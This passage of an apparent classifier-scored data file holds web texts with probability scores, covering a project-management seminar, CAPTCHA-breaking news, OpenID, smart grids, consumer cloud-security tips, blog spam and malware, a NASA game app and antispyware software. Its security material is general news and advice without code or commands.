26 January 1912. Scott's party perished. As historical drama, why this happened is interesting enough, but to project managers, the story is fascinating. Lessons abound. Read more about this program. Here's an upcoming date for this program: - The Race to the South Pole: The Power of Agile Development - On 14 December 1911, four men led by Roald Amundsen reached the South Pole. Thirty-five days later, Robert F. Scott and four others followed. Amundsen had won the race to the pole. Amundsen's party returned to base on 26 January 1912. Scott's party perished. As historical drama, why this happened is interesting enough. Lessons abound. Among the more important lessons are those that demonstrate the power of the agile approach to project management and product development. Read more about this program. Here's an upcoming date for this program: - The Politics of Meetings for People Who Hate Politics - There's a lot more to running an effective meeting than having the right room, the right equipment, and the right people. With meetings, the whole really is more than the sum of its parts. How the parts interact with each other and with external elements is as important as the parts themselves. And those interactions are the essence of politics for meetings. This program explores techniques for leading meetings that are based on understanding political interactions, and using that knowledge effectively to meet organizational goals. Read more about this program. Here's an upcoming date for this program: - TBD, Mansfield, MA: August 21, Regional Event, PMI MassBay, PMI Central Mass, Ocean State PMI, PMI Keene, PMI Southern New England.",
        "prob": "tensor([[0.0029, 0.9971]])"
    },
    {
        "text": "Challenge-response techniques called \"CAPTCHAs\" designed to keep spambots off Web sites can easily be broken by humans who are paid to type in the responses, according to a new report from security firm Imperva. CAPTCHAs, which stands for Completely Automated Public Turing test to tell Computers and Humans Apart, are created by programs and are intended to be difficult for computers to fill out. When it launched in 2010, NuCaptcha touted its proprietary technology as being able to \"provide the highest level of security available\" by using video streams to display those distorted letters you type in to prove you're really a human. Now, however, the company's claims of providing \"the next generation of Captcha security\" look a tad optimistic. A team of Stanford University researchers said today that they discovered a way to break the security of a recent version of NuCaptcha's video Captcha by borrowing concepts from the field of machine vision, which developed techniques … Read more PALO ALTO--A team of Stanford University researchers has bad news to report about Captchas, those often unreadable, always annoying distorted letters that you're required to type in at many a Web site to prove that you're really a human. Many Captchas don't work well at all. More precisely, the researchers invented a standard way to decode those irksome letters and numbers found in Captchas on many major Web sites, including Visa's Authorize.net, Blizzard, eBay, and Wikipedia. Google TV uncovers an update, something is sucking the life from the iPhone 4S, and evil robots cannot be stopped by Captcha...or at least some of them. Links from Monday's spook-tacular episode of Loaded:Captchas can't stop evil bots Google TV... it's baaaaack GameStop gone mad? It's selling tablets now. The Microsoft Kinect SDK is alive! What's sucking the life from iPhone 4S? Subscribe: iTunes (MP3) | iTunes (320x180) | iTunes (HD) | RSS (MP3) | RSS (320x180) | RSS HD Modern captchas are effective at keeping bots and algorithms from accessing Web sites made for humans. They also generate collateral damage and keep up to 25 percent of humans out, too, according to Ron Moravek, COO of NuCaptcha. He says he has a better, more flexible technology for filtering humans from bots. NuCaptcha is a replacement technology for the free, Google-owned ReCaptcha service. There are two major differences between NuCaptcha and ReCaptcha. First, NuCaptcha displays moving text against a moving image. While this makes it harder for computers to discern text from background, it makes it much easier for humans. … Read more Cybercriminals are likely to find more jobs next year, one of five top trends forecast by security vendor Fortinet. In an ironic twist in the job market, more positions will open up for developers who can write customized malware packers, people who can break CAPTCHA codes, and distributors who can spread malicious code, according to Fortinet. And though cybercrooks have typically deployed their own botnets themselves, Fortinet believes this job will increasingly be farmed out to middlemen, citing the Alureon and Hiloti botnets as two examples of malware distributed this way. Money mules responsible for wiring funds and cashing checks … Read more Facebook just launched a new suite of features for Facebook Places that might be the beginning of the end for Web privacy as we know it. Luckily Natali Del Conte is around to calm us down and explain what's really going on with the new location-based deals. Facebook Places is a service that lets users share their location directly on their mobile phones, but the latest product is called Deals, and it allows businesses to advertise to target customers by offering a special discount for those who \"check in\" at a location. Once users activate it, Facebook will share the deal on their walls so others can cash in as well, and business can even offer \"loyalty\" discounts for members that return to a venue. The FourSquare and Loopt offices must be getting pretty hot right now. If mobile tracking weren't enough, soon you won't even be able to watch a movie without being watched yourself! In an effort to combat Web piracy, some movie theaters are installing video cameras in front of the movie screens, designed to also monitor crowd reactions to trailers for market research on what audiences prefer to watch. Even worse, the same company, Aralia Systems, is also planning to roll out infrared scanning systems at the ticket-purchasing stations that scan for recording devices and will sound an alarm to alert management if an illegal instrument is detected. It sounds similar to the TSA's \"enhanced\" security screenings we've been hearing about recently! Internet \"Captchas\" have been around for a while--they're tests placed on some Web sites to determine whether the user is human, and they usually come in the form of a randomly generated word or phrase that you have to copy into a field to gain access. They're only slightly irritating and require little participation to enter, but a software firm called NuCaptcha is hoping that video advertisement captchas will be the online ads of the future. Instead of traditional squiggly words, the new system forces users to watch a video advertisement with a short message scrolling across it. After it's done, it'll ask you to identify and retype a part of the message to continue toward your destination, and although it sounds like an annoying process, companies like EA, Wrigley, and Disney have already signed up with hopes that people will actually pay attention to the ads instead of just clicking through. Soon we'll be reminiscing about a time when all you needed was a pop-up blocker to surf under the radar! Thanks to Natali Del Conte for joining us on this rainy Thursday, and be sure to check us out tomorrow morning with Steve Guttenberg, aka The Audiophiliac!Episode 702 Subscribe in iTunes audio | Suscribe to iTunes (video) | Subscribe in RSS Audio | Subscribe in RSS Video… Read more Natali Del Conte joins us in the studio to discuss really important issues such as boobquake day, cartoons, and violent video games. Oh, come on, we also discuss Google's failed attempts to reinvent the mobile phone sales paradigm, unfounded causal links between violent video games and sociopathic behavior, and the dangers of colonization. Good show, guys.Subscribe with iTunes (audio) Subscribe with iTunes (video) Subscribe with RSS (audio) Subscribe with RSS (video) EPISODE 1214 Google Nexus One Gone From Verizon Lineup http://jkontherun.com/2010/04/26/no-nexus-one-on-verizo/ http://preview.bloomberg.com/news/2010-04-26/verizon-says-it-has-no-current-plans-to-distribute-google-nexus-one-phone.html http://www.cnet.com/8301-19736_1-20003397-251.html… Read more Facebook on Thursday fended off an attack in which multiple identical profiles were created to spread malware. Antivirus provider AVG Technologies said users of its LinkScanner service detected numerous profiles that were identical except with different names and each included a link to what was represented as a home video but which instead displayed a fake antivirus alert when clicked. The scams are designed to trick people into paying for software they don't need, to get credit card information from victims for identity fraud purposes, and often to install spyware on the computer. \"Clearly, the Data Snatchers have … Read more",
        "prob": "tensor([[2.0528e-06, 1.0000e+00]])"
    },
    {
        "text": "Single Sign On When the World Wide Web made its debut more than a decade ago, keeping track of login names and passwords was fairly simple. As the web grew in popularity, and new services like banking and shopping online came of age, more and more services required users to create special names and passwords to access personal information, or other 'members only' features. For an active Internet user, these login combinations could multiply quickly. Passwords soon needed to be at least eight characters and contain extra numbers or characters to prevent security problems. Some times when you created a new user name, you found your username was in use, and pretty soon you needed a file to keep all your different login combinations straight. Often post-it notes with your usernames and passwords could be found stuck on your monitor or under your keyboard. How secure is that? Recently, a new alternative to all the confusion is gaining momentum in the online world, called OpenID. The concept, originally developed in 2005, allows users to get access to any OpenID enabled site using a single 'trusted' username and password. You may already have an OpenID you aren't aware of from services like Google, Yahoo, AOL, Verisign, Paypal and many others. When you encounter a service using OpenID, your username and password is checked from a trusted OpenID source like those mentioned above, and you're granted access. This system is considered to be very secure, and very convenient, and is now being adopted by many government bodies who see the benefits of individuals using a single, secure identification for the web, including the City of Nanaimo. OpenID in Government The City of Nanaimo is not alone in recognising this global need. The US Federal Government has recently committed to embrace OpenID to allow simple access to citizen resources (http://openid.net/government/). As of November 2008, there were over 500 million OpenIDs on the Internet and approximately 27,000 sites had integrated the OpenID standard*. (* see - http://en.wikipedia.org/wiki/OpenID) City of Nanaimo Services Using OpenID The first two City sites to use OpenID are Secret Nanaimo (www.secretnanaimo.com) and our recently updated Emergency Notification System (http://www.nanaimo.ca/EN/main/departments/FireRescue.html#CallAlert). City departments are working to provide new online services using OpenID. We are also working closely with commercial software providers to enable OpenID support for all of our citizen services.Go to Top",
        "prob": "tensor([[2.1951e-06, 1.0000e+00]])"
    },
    {
        "text": "Utilities around the world are implementing smart utility networks to strengthen an aging electricity grid. Smart Grid renovation is well underway in the US, Europe ,China and Australia. Momentum is picking up everywhere in the world. For example: the UK is working on a major implementation, and has just released Smart Meter Technical Specifications; Smart utility networks using wireless mesh networking technology have seen the largest implementation to date . However, other systems based on Cellular technology, Powerline Communications (PLC), WiLAN, and WiMax, are also being used for backhaul communication. The special report discusses the network architecture, system and network components, and comparison of different technology options. The report also addresses the standards being used for these networks. While the main focus is on electric utilities, water and gas distribution networks are also addressed. Smart Utility networks support a number of applications ranging from reading of energy consumption at end-points, consumption/ The report is useful to all those involved in the smart grid/smart energy business. It provides a basic understanding of the network and sensor technologies deployed in the utility distribution network, and the applications they are being used for. Further, the report addresses the utilization of IPv6 in these networks. Standards are an important element and the report addresses the international standards utilized in these networks, and test and certification process employed. A summary of the report is published in the SPOTLIGHT section in Smart Energy Universe this week. Contact SEU at firstname.lastname@example.org for more information about ordering the report. SEU is currently working on security aspects of the Grid and a report to be released shortly will address cybersecurity issues in the smart grid. About Smart Energy Universe Smart Energy Universe (www.smartenergyuniverse.com) provides the latest and most comprehensive coverage of global smart energy/smart grid business, systems, technology, and standards. SEU’s site is completely refreshed with totally new content each week.",
        "prob": "tensor([[0.0379, 0.9621]])"
    },
    {
        "text": "Friends and colleagues have been expressing doubt about entrusting their data to “The Cloud”, especially in light of the recent high profile attacks on the CIA, the Senate, and Sony (among many others). As educators are increasingly adopting cloud-based tool in instruction, it’s very important to have a clear idea of what we’re really talking about here, and to clear up as much FUD as possible. “The Cloud” is not one thing—while the many recent hacks are being lumped together in the mainstream media, there were different circumstances in each case, and each teaches us a different lesson about online security. The Sony hack was a particularly bad one because they stored all their users’ passwords in un-encrypted text. Since so many people use the same password for multiple online services, it’s likely that your playstation password is also the password you use for your email, your bank, and your paypal account. Hackers got these poorly-protected passwords, Sony didn’t notify the public for 5 days, so the hackers had a field day with the data and got into several other accounts. 1. Use unique strong passwords for all of your different “cloud” accounts. This way if one password gets compromised it does not open up all the rest of your accounts as well. Using a password manager like LastPass can help (I swear by it), or you can also create a hard-to-guess-but-easy-to-remember password formula. 2. Don’t store your passwords in your browser’s memory. Again, LastPass is great for this because it encrypts them. 3. Investigate the security practices of cloud services you trust with your sensitive data. Some of the most high-profile attacks by LulzSec (like the CIA & Senate website attacks) were Denial of Service (DOS) attacks—meaning that they did not actually gain access to any unprotected data. A DOS basically floods a website with so many requests that it can’t process them all and the website goes offline temporarily. It’s like getting everyone you know to go ring someone’s doorbell one after another until they stop answering the door. It might drive that person nuts, but it also doesn’t open the door. These attacks are now commonly performed with botnets—large armies of computers infected with viruses that allow one hacker to direct millions of computers (often unbeknownst to their owners) to access the target website and bring it down. Large cloud services like Amazon and Google are designed to withstand these attacks by re-allocating their enormous computing resources to meet all the requests and keep the websites up and running during the attack. Smaller servers without as many resources are most vulnerable to DoS attacks. 1. Use virus protection software on your computer and perform all necessary updates as soon as they’re released. 2. Keep your browser & plugins up to date. This tool will scan your browser and plugins for security vulnerabilities. Of course, LulzSec and others have been perpetrating more sophisticated attacks than DoSes. They have been exposing security flaws in their targets’ websites which will eventually lead to better security practices across the board. I know it has forced me to be more careful with my personal security practices and it has been pretty easy to do. (My data was exposed in the Sony hack and last year’s Gawker hack, but I’ve taken some simple steps to minimize the damage that anyone can do.) In the meantime, there is a lot you can do to protect yourself online—even in “The Cloud”. - Guard That Password (and Make Sure It’s Encrypted) (nytimes.com) - 6 Password Protection Lessons Learned from the Sony Hacker Attack (savings.com) - LastPass Alternatives That Keep Your Passwords Safe From Online Hacking (gizmodo.com.au) - Hackers attack Sony network again (bbc.co.uk) - Sony BMG Greece hacked (go.theregister.com) - Why I Can Guess Your iPad Password (techland.time.com)",
        "prob": "tensor([[2.0472e-06, 1.0000e+00]])"
    },
    {
        "text": "Malware and spam in blogs Whatever attracts us on the Internet also attracts malware. So as blogs (short for web logs) became popular by 2003, spammers and hackers discovered new possibilities to spread spam and malware. Blog spam (also called comment spam or spomments) is created by automatically posting random comments or promoting commercial services in the comment section of blogs, as well as in guestbooks, wikis, or other publicly accessible online discussion boards. Any web application that displays hyperlinks submitted by visitors is a potential target. The goal of the spammer is to add links across the web that point to his website, thus artificially increasing that site's search engine ranking and the number of potential visitors and paying customers. This type of spam originally appeared in Internet guestbooks, where spammers repeatedly filled guestbooks with links to their own website and no relevant comment. Most blog spam falls into one of three categories: Comment spam - unsolicited and mostly unrelated comment on a blog that advertises a product or a website. Some of it might be added manually by a person to a particular blog entry, but most comment spam comes from scripts that can add many comments automatically to one post or many posts simultaneously. Trackback spam - spammers develop scripts that use blog software's trackback features to automatically place spam on different blogs. Spam blog (or splog) - a blog created for no other purpose than to advertise products or point visitors to various websites. Though ignored by most people, these blogs pollute the results of search engines that index websites. Blogs hosting malware Apart from spam, blogs are also becoming a means of spreading malicious code and keylogging software. Blogs are an obvious backdoor opportunity for unknown exploits to invade legitimate sites. According to a report from March 2011, more than one million websites were believed to be infected with malware in the fourth quarter of 2010, nearly double compared to the previous year. The year 2010 also saw various variants of the computer virus Liza Moon using blogs to spread. Liza Moon has affected more than 4 million website, according to a recent report by AllVoices.com. The virus, named after the website that discovered it, was first reported on March 29 2010, with the first confirmed attack taking place in December 2010. The virus infects computers by injecting malicious SQL codes on a website and redirects users to another website containing a Trojan. Users are then told their computers are infected by a computer virus and are prompted to download an anti virus software called Windows Stability Centre, the report stated. As a blogger, you have several ways of preventing spam comments: from verification text boxes which require human action (such as typing the letters displayed in a picture) to dedicated prevention tools - such as Akismet for Wordpress. You can prevent more serious attacks to the blog structure by keeping your blog platform updated (just like you would do with your operating system). If you don’t have one yourself, but like to read other peoples blogs, you can stay safe by having active and updated internet security software on your PC at all times.",
        "prob": "tensor([[2.1718e-06, 1.0000e+00]])"
    },
    {
        "text": "NASA Releases Interactive Space Communications Mobile Game App MOFFETT FIELD, Calif. -- Just in time for World Space Week, NASA has released a new mobile application that challenges gamers to take on the role of a space communications network manager and puts them in charge of building a communications network to support scientific missions. The educational application, \"Space Communications and Navigation: NetworKing,\" was developed at NASA's Ames Research Center in Moffett Field, Calif., for the iPad and iPhone. NetworKing provides an interactive, 3-D experience with an insider's perspective into how mission controllers and scientists communicate with spacecraft and satellites using the space, deep space and near Earth networks. \"This game introduces the complex world of space communications to gamers,\" said Barbara Adde, policy and strategic communications director for the Space Communications and Navigation Division at NASA Headquarters in Washington. \"It gives players the opportunity to enjoy a challenging game while absorbing the basic concepts of space communications. The game provides an engaging way to increase interest in the areas of science, technology, engineering and mathematics and opens minds to potential careers in these fields.\" NetworKing allows players to build increasingly large and complex communication networks to support client satellites conducting scientific missions. Players who upgrade their communication networks can acquire more complex clients, such as the International Space Station and NASA's Hubble and Kepler space telescopes. By providing insight into the complex world of communications between astronauts, mission controllers, scientists and satellites in real mission scenarios, the game is not only challenging, but also entertaining. In addition to the mobile application, NetworKing also is available free on the NASA 3-D Resources website. Players can access the game on their web browsers or it can be downloaded and run on PC or Macintosh operating systems. For links to download the app, download the game or play in a web browser, visit: - end - text-only version of this release NASA press releases and other information are available automatically by sending a blank e-mail message to To unsubscribe from this mailing list, send a blank e-mail message to Back to NASA Newsroom | Back to NASA Homepage",
        "prob": "tensor([[0.1060, 0.8940]])"
    },
    {
        "text": "With technological advancement, there comes a risk for every convenience. The popularity of online shopping and banking also gave birth to the opportunists such as hackers. Before, virus used to be the most difficult security issue to resolve but the evolution of malware changes everything. Identity theft and other means of privacy invasion have been rampant these days. Blame the spyware for it. Spyware is a type of malware which can be installed on computers to collect user information without the owner’s knowledge and permission. Personal computers used to be the target of spyware but as day goes on, keyloggers have been installed on shared, corporate and public computers. Different spyware programs can collect personal information, control user’s activity in the form of webpage redirection, allow download or installation of related spyware, modify computer settings, trasmit information and more. To prevent cases like this, it is important to have antispyware software. There are applications that offer antivirus, antispyware and firewall all in one. But some companies prefer specific programs for each line of security. Antispyware for Enterprises is a corporate antispyware solution that can centralize the antispyware monitoring among IT administrators. Businesses need a good antispyware package to ensure security. Though there may be different standard, a good antispyware should be able to do the following: scan, protect, remove and update. Real-time monitoring should be activated all the time. It should also prevent spyware attacks, remov existing spyware, and update itself to keep abreast with the developing threats.",
        "prob": "tensor([[2.1199e-06, 1.0000e+00]])"
    }
]